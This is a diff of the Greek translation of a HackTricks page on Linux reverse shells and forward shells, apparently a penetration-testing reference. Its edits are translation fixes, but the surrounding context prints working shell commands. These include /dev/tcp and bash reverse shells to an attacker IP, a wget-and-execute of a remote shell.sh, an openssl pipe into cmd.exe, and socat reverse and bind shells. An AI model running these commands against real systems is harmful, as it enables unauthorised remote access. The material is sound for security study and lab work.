@@ -9,7 +9,7 @@
 <summary>Υποστήριξη HackTricks</summary>
 
 * Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
-* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Εγγραφείτε στο** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) ή στο [**telegram group**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
@@ -34,9 +34,9 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-Μην ξεχάσετε να ελέγξετε με άλλες θάλασσες: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh και bash.
+Μην ξεχάσετε να ελέγξετε με άλλα κέλυφη: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh και bash.
 
-### Συμβολική ασφαλής θάλασσα
+### Symbol safe shell
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -62,7 +62,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 
 Όταν ασχολείστε με μια **Remote Code Execution (RCE)** ευπάθεια σε μια εφαρμογή ιστού βασισμένη σε Linux, η επίτευξη ενός reverse shell μπορεί να εμποδιστεί από αμυντικά δίκτυα όπως οι κανόνες iptables ή περίπλοκοι μηχανισμοί φιλτραρίσματος πακέτων. Σε τέτοιες περιορισμένες συνθήκες, μια εναλλακτική προσέγγιση περιλαμβάνει τη δημιουργία ενός PTY (Pseudo Terminal) shell για να αλληλεπιδράσετε με το παραβιασμένο σύστημα πιο αποτελεσματικά.
 
-Ένα προτεινόμενο εργαλείο για αυτό το σκοπό είναι το [toboggan](https://github.com/n3rada/toboggan.git), το οποίο απλοποιεί την αλληλεπίδραση με το περιβάλλον στόχου.
+Ένα προτεινόμενο εργαλείο για αυτό το σκοπό είναι το [toboggan](https://github.com/n3rada/toboggan.git), το οποίο απλοποιεί την αλληλεπίδραση με το περιβάλλον στόχο.
 
 Για να χρησιμοποιήσετε το toboggan αποτελεσματικά, δημιουργήστε ένα Python module προσαρμοσμένο στο RCE πλαίσιο του συστήματος στόχου σας. Για παράδειγμα, ένα module με όνομα `nix.py` θα μπορούσε να δομηθεί ως εξής:
 ```python3
@@ -92,7 +92,7 @@ return response.text
 ```shell
 toboggan -m nix.py -i
 ```
-Για να εκμεταλλευτείτε άμεσα ένα διαδραστικό shell. Μπορείτε να προσθέσετε `-b` για την ενσωμάτωση του Burpsuite και να αφαιρέσετε το `-i` για μια πιο βασική rce wrapper.
+Για να εκμεταλλευτείτε άμεσα ένα διαδραστικό shell. Μπορείτε να προσθέσετε `-b` για την ενσωμάτωση του Burpsuite και να αφαιρέσετε το `-i` για μια πιο βασική περιτύλιξη rce.
 
 Μια άλλη δυνατότητα είναι η χρήση της υλοποίησης forward shell του `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
@@ -100,7 +100,7 @@ toboggan -m nix.py -i
 
 * Το URL του ευάλωτου host
 * Το πρόθεμα και το επίθημα του payload σας (αν υπάρχει)
-* Τον τρόπο αποστολής του payload (headers; data; επιπλέον πληροφορίες;)
+* Τον τρόπο αποστολής του payload (κεφαλίδες; δεδομένα; επιπλέον πληροφορίες;)
 
 Στη συνέχεια, μπορείτε απλά να **στείλετε εντολές** ή ακόμα και **να χρησιμοποιήσετε την εντολή `upgrade`** για να αποκτήσετε ένα πλήρες PTY (σημειώστε ότι οι σωλήνες διαβάζονται και γράφονται με καθυστέρηση περίπου 1.3 δευτερολέπτων).
 
@@ -257,7 +257,7 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
 ```
-### Αντίστροφη Σκηνή
+### Αντεστραμμένη κέλυφος
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
